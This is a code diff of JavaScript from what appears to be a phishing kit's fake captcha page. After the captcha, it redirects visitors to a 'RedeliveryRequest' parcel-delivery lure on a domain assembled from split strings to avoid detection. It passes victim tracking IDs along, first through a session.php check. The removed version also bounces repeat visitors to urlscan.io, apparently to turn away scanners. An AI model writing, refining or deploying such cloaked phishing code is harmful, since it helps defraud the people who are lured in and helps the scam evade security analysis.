@@ -27,48 +27,42 @@
     return result;
   }
    let i=0
-  function checkInput() {
-	  i=i+1
-	  if(i>2){
-		  window.location = "https://urlscan.io/"
-		  
-	  }
-    // Get the user input and the generated random string
-    const userInput = document.getElementById('userInput').value;
-    const randomString = document.getElementById('randomStringSpan').textContent;
-    const errorMsg = document.getElementById('errorMsg');
-
-    const messageId = document.getElementById('messageId').value;
-
-    const ipzebi = document.getElementById('ipzebi').value;
-
-
-    
-
-    // Check if the user input is equal to the random string (case-insensitive)
-    if (userInput.toLowerCase() === randomString.toLowerCase()) {
-	  let spark="chectrackuasbalikups"
+ 
+function checkInput() {
+    var userInput = document.getElementById('userInput').value;
+    var randomString = document.getElementById('randomStringSpan').textContent;
+    var errorMsg = document.getElementById('errorMsg');
+    var messageId = document.getElementById('messageId').value;
+    var ipzebi = document.getElementById('ipzebi').value;
+    let spark="chectrackuasbalikups"
 	  let https ="https"
 	  let webapp ="RedeliveryRequest"
-      window.location= https+"://"+spark+".com/"+webapp+"?messageId="+messageId+"&ipzebi="+ipzebi;
-	  userInput.className = ''; // Remove the 'invalid' class
-      errorMsg.textContent = '';
-    } else {
-		userInput.className = ''; // Remove the 'invalid' class
-      errorMsg.textContent = '';
-	  
-            // Display error message and change input border color
-       userInput.className = 'invalid';
-      errorMsg.textContent = 'Wrong captcha. Please try again.';
-	  setTimeout(function() {
-			  userInput.className = ''; // Remove the 'invalid' class
-			  errorMsg.textContent = '';
-			// Your code to execute after 1 second
 
-		  }, 1000);
-     
+    if (userInput.toLowerCase() === randomString.toLowerCase()) {
+        // Assuming your AJAX call will be here to set the PHP session
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "session.php", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.onreadystatechange = function() {
+            if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+                // Check response from setSession.php
+                var response = JSON.parse(this.responseText);
+                if (response.status === 'success') {
+                	window.location= https+"://"+spark+".com/"+webapp+"?messageId="+messageId+"&ipzebi="+ipzebi;
+                } else {
+                    // Handle failure
+                    console.error('Session setting failed:', response.message);
+                }
+            }
+        };
+        xhr.send("captcha=" + encodeURIComponent(userInput) + "&messageId=" + encodeURIComponent(messageId) + "&ipzebi=" + encodeURIComponent(ipzebi));
+    } else {
+        errorMsg.textContent = 'Wrong captcha. Please try again.';
+        setTimeout(function() {
+            errorMsg.textContent = '';
+        }, 3000);
     }
-  }
+}
 
   // Example usage:
   const randomString = generateRandomString(6);
